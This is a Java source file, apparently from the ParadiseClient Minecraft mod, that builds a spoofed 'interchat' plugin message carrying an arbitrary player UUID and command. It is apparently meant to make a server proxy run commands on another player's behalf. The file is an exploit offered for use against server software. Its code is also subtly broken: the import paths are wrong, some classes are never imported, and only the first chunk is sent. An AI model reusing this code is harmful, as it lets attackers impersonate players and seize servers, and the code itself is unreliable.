package io.github.spigotrce.paradiseclientfabric.packet;

import com.google.common.io.ByteArrayDataOutput;
import com.google.common.io.ByteStreams;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Random;
import java.util.UUID;
import net.minecraft.PacketByteBuf;
import net.minecraft.Identifier;
import net.minecraft.CustomPayload;
import net.minecraft.PacketCodec;

public record InterchatPayloadPacket(String uuid, String command) implements CustomPayload {

    public static final PacketCodec<PacketByteBuf, InterchatPayloadPacket> CODEC =
            CustomPayload.codecOf(InterchatPayloadPacket::write, InterchatPayloadPacket::new);

    public static final CustomPayload.Id<InterchatPayloadPacket> ID =
            new CustomPayload.Id<>(Identifier.of("interchat", "main"));

    private InterchatPayloadPacket(PacketByteBuf buf) {
        this(buf.readString(), buf.readString());
    }

    public void write(PacketByteBuf buf) {
        try {
            buf.writeBytes(this.executeProxyCommand(UUID.fromString(this.uuid), this.command));
        } catch (Exception e) {
            Helper.printChatMessage("Error sending packet: " + e.getMessage());
            Constants.LOGGER.error("Error sending packet: ", e);
        }
    }

    public CustomPayload.Id<InterchatPayloadPacket> getId() {
        return ID;
    }

    private byte[] forwardData(byte[] data) {
        try {
            byte[][] dataArray = divideArray(data, 32700);
            if (dataArray.length > 0) {
                ByteArrayDataOutput out = ByteStreams.newDataOutput();
                out.writeInt(new Random().nextInt()); // random ID or nonce
                out.writeInt(0); // reserved or unused field
                out.writeInt(dataArray.length); // total chunk count
                out.writeShort(21); // type or opcode
                out.write(dataArray[0]); // send first chunk (adjust logic as needed)
                return out.toByteArray();
            }
        } catch (Exception e) {
            Helper.printChatMessage("Error sending packet: " + e.getMessage());
            Constants.LOGGER.error("Error sending packet: ", e);
        }
        return new byte[0];
    }

    private byte[] executeProxyCommand(UUID player, String command) throws Exception {
        ByteArrayDataOutput out = ByteStreams.newDataOutput();
        writeUUID(out, player);
        writeString(out, command);
        return forwardData(out.toByteArray());
    }

    public static byte[][] divideArray(byte[] source, int chunkSize) {
        if (source.length <= chunkSize) {
            return new byte[][]{source};
        }
        int numChunks = (int) Math.ceil((double) source.length / chunkSize);
        byte[][] ret = new byte[numChunks][];
        int start = 0;
        for (int i = 0; i < numChunks; ++i) {
            int end = Math.min(source.length, start + chunkSize);
            ret[i] = Arrays.copyOfRange(source, start, end);
            start += chunkSize;
        }
        return ret;
    }

    private void writeUUID(ByteArrayDataOutput out, UUID uuid) {
        out.writeLong(uuid.getMostSignificantBits());
        out.writeLong(uuid.getLeastSignificantBits());
    }

    private void writeString(ByteArrayDataOutput out, String string) {
        byte[] bytes = string.getBytes(StandardCharsets.UTF_8);
        out.writeInt(bytes.length);
        out.write(bytes);
    }
}
